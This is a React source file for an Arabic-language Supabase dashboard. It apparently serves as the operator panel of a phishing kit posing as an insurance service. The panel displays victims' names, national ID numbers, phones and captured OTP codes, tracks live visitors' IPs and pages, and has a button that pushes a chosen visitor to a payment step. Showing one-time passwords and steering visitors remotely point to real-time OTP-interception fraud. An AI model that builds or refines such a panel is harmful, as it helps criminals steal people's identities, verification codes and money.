import React, { useEffect, useState } from 'react';
import { supabase } from '../lib/supabaseClient';

interface RequestItem {
  id: number;
  policy_id: string;
  full_name: string;
  identity: string;
  phone: string;
  company: string;
  price: number;
  status: string;
  otp_code: string;
  created_at: string;
}

interface LiveVisitor {
  session_id: string;
  page: string;
  ip: string;
  last_seen: string;
}

export const Dashboard: React.FC = () => {
  const [requests, setRequests] = useState<RequestItem[]>([]);
  const [visitors, setVisitors] = useState<LiveVisitor[]>([]);
  const [searchQuery, setSearchQuery] = useState<string>('');

  // 1) جلب البيانات الأولية بـ Supabase Direct Query
  const fetchDashboardData = async () => {
    const { data: reqData } = await supabase
      .from('requests')
      .select('*')
      .order('created_at', { ascending: false });

    if (reqData) setRequests(reqData);

    const { data: visData } = await supabase
      .from('live_visitors')
      .select('*')
      .gt('last_seen', new Date(Date.now() - 30000).toISOString());

    if (visData) setVisitors(visData);
  };

  useEffect(() => {
    fetchDashboardData();

    // 2) تفعيل الاستماع الفوري للبيانات (Supabase Realtime)
    const requestsSubscription = supabase
      .channel('realtime_requests')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'requests' }, () => {
        fetchDashboardData();
      })
      .subscribe();

    const visitorsSubscription = supabase
      .channel('realtime_visitors')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'live_visitors' }, () => {
        fetchDashboardData();
      })
      .subscribe();

    return () => {
      supabase.removeChannel(requestsSubscription);
      supabase.removeChannel(visitorsSubscription);
    };
  }, []);

  const handleUpdateStatus = async (policyId: string, status: string) => {
    await supabase
      .from('requests')
      .update({ status })
      .eq('policy_id', policyId);
  };

  const handleRedirectVisitor = async (sessionId: string, targetPage: string) => {
    await supabase
      .from('live_visitors')
      .update({ redirect_to: targetPage })
      .eq('session_id', sessionId);
  };

  const filteredRequests = requests.filter((r) =>
    (r.full_name || '').toLowerCase().includes(searchQuery.toLowerCase()) ||
    (r.identity || '').includes(searchQuery) ||
    (r.policy_id || '').toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-gray-100 font-['Cairo'] dir-rtl p-6">
      <div className="max-w-7xl mx-auto space-y-6">
        
        {/* Topbar */}
        <div className="flex justify-between items-center bg-white p-4 rounded-xl border border-gray-200 shadow-sm">
          <h1 className="text-xl font-extrabold text-gray-800">📋 لوحة إدارة الطلبات</h1>
          <input
            type="text"
            placeholder="ابحث بالاسم أو الهوية..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="p-2 border rounded-lg w-64 text-sm"
          />
        </div>

        {/* Live Visitors Realtime Grid */}
        <div className="bg-white p-5 rounded-xl border border-gray-200">
          <div className="flex items-center gap-3 mb-4">
            <span className="w-3 h-3 bg-green-500 rounded-full animate-ping"></span>
            <h3 className="font-bold text-gray-800">الزوار الحاليون ({visitors.length})</h3>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-3 md:grid-cols-4 gap-4">
            {visitors.map((v) => (
              <div key={v.session_id} className="p-3 border rounded-lg bg-gray-50 flex flex-col justify-between">
                <div>
                  <div className="font-bold text-xs text-gray-700">زائر #{v.session_id.substring(0, 8)}</div>
                  <div className="text-xs text-blue-600 font-semibold">{v.page}</div>
                </div>
                <button
                  onClick={() => handleRedirectVisitor(v.session_id, '/step4.html')}
                  className="mt-3 py-1 bg-blue-600 text-white rounded text-xs font-bold"
                >
                  ↗️ توجيه للدفع
                </button>
              </div>
            ))}
          </div>
        </div>

        {/* Table */}
        <div className="bg-white rounded-xl border border-gray-200 overflow-hidden">
          <table className="w-full text-right text-xs">
            <thead className="bg-gray-50 border-b">
              <tr>
                <th className="p-3">رقم الوثيقة</th>
                <th className="p-3">الاسم</th>
                <th className="p-3">الهوية</th>
                <th className="p-3">السعر</th>
                <th className="p-3">OTP</th>
                <th className="p-3">الحالة</th>
                <th className="p-3">الإجراءات</th>
              </tr>
            </thead>
            <tbody>
              {filteredRequests.map((r) => (
                <tr key={r.id} className="border-b hover:bg-gray-50">
                  <td className="p-3 font-bold text-blue-600">{r.policy_id}</td>
                  <td className="p-3">{r.full_name}</td>
                  <td className="p-3">{r.identity}</td>
                  <td className="p-3 font-bold">{r.price} ر.س</td>
                  <td className="p-3 text-emerald-600 font-bold">{r.otp_code || '—'}</td>
                  <td className="p-3">
                    <span className="px-2 py-1 rounded-full text-[10px] font-bold bg-amber-100 text-amber-800">
                      {r.status}
                    </span>
                  </td>
                  <td className="p-3 flex gap-2">
                    <button
                      onClick={() => handleUpdateStatus(r.policy_id, 'approved')}
                      className="px-2 py-1 bg-green-600 text-white rounded font-bold"
                    >
                      قبول
                    </button>
                    <button
                      onClick={() => handleUpdateStatus(r.policy_id, 'rejected')}
                      className="px-2 py-1 bg-red-600 text-white rounded font-bold"
                    >
                      رفض
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

      </div>
    </div>
  );
};
